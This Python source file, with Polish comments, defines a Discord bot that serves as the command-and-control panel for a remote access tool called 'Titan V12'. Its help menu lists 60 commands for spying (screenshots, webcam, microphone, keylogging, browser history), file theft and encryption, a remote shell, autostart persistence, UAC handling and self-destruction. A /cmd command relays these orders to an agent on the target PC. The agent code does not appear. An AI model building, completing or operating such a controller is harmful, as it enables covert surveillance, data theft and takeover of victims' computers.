import discord
from discord import app_commands
from discord.ext import commands

# Hosting pobiera token z zmiennych środowiskowych (bezpiecznie)
import os
TOKEN = os.getenv("DISCORD_TOKEN") 

class TitanBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        # To rejestruje komendy / na serwerze
        await self.tree.sync()
        print(f"✅ Bot na hostingu gotowy!")

bot = TitanBot()

# KOMENDA HELP / INFO
@bot.tree.command(name="krasnal_info", description="Lista 60 funkcji systemu Titan V12")
async def krasnal_info(interaction: discord.Interaction):
    embed = discord.Embed(title="🛡️ KATALOG KOMEND TITAN V12", color=0xFF0000)
    embed.add_field(name="👁️ Spy (1-10)", value="`scr`, `cam`, `mic`, `clip`, `keyon`, `keyoff`, `vid`, `history`, `active`, `files`", inline=False)
    embed.add_field(name="⚙️ System (11-20)", value="`info`, `procs`, `kill`, `cpu`, `ram`, `bat`, `uptime`, `drv`, `serv`, `users`", inline=False)
    embed.add_field(name="📂 Files (21-30)", value="`ls`, `cd`, `get`, `put`, `rm`, `mkdir`, `enc`, `dec`, `find`, `size`", inline=False)
    embed.add_field(name="🌐 Network (31-40)", value="`ip`, `lip`, `wifi`, `ping`, `dns`, `ports`, `netstat`, `mac`, `hosts`, `web`", inline=False)
    embed.add_field(name="🎭 Troll (41-50)", value="`msg`, `rotate`, `drunk`, `hide`, `show`, `eject`, `wp`, `calc`, `min`, `black`", inline=False)
    embed.add_field(name="💀 Admin (51-60)", value="`autoon`, `autooff`, `shell`, `ps`, `taskadd`, `taskrm`, `uac`, `off`, `reboot`, `self_destruct`", inline=False)
    embed.set_footer(text="Użyj /cmd [nazwa] aby wywołać akcję")
    await interaction.response.send_message(embed=embed)

# KOMENDA DO WYKONYWANIA
@bot.tree.command(name="cmd", description="Wykonaj jedną z 60 funkcji")
@app_commands.describe(akcja="Wpisz kod komendy (np. scr, drunk, autoon)")
async def cmd(interaction: discord.Interaction, akcja: str, parametr: str = ""):
    # Bot wysyła wiadomość, którą przechwyci Agent na Twoim PC
    await interaction.response.send_message(f"🚀 WYKONUJĘ: `{akcja}` | Parametr: `{parametr}`")

bot.run(TOKEN)
